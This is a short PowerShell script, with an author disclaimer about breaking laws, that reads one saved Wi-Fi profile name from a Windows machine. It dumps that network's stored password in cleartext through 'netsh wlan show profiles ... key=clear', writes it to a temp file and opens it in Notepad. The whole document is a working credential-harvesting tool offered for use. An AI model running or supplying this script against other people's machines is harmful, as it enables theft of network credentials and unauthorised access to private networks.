<# 

Author: Ozunu
Date: 20/11/2017

Note: Thanks to all the help everyone! 

- - - - - - - - - - -

You take responsibility for any laws you break with this, I simply point out the security flaw
#>

#  ------------- Run Powershell Script -------------

$Wlan =  netsh wlan show profiles | Select-String -Pattern "All User Profile"

$WlanName = ($Wlan -split ":")[-1].Trim() -replace '"'

$WLanPass = netsh wlan show profiles $WlanName key=clear

$WLanPass| Out-File "$env:TMP\WifiPassword.txt"

notepad.exe "$env:TMP\WifiPassword.txt"


#  ------------- End Powershell Script -------------
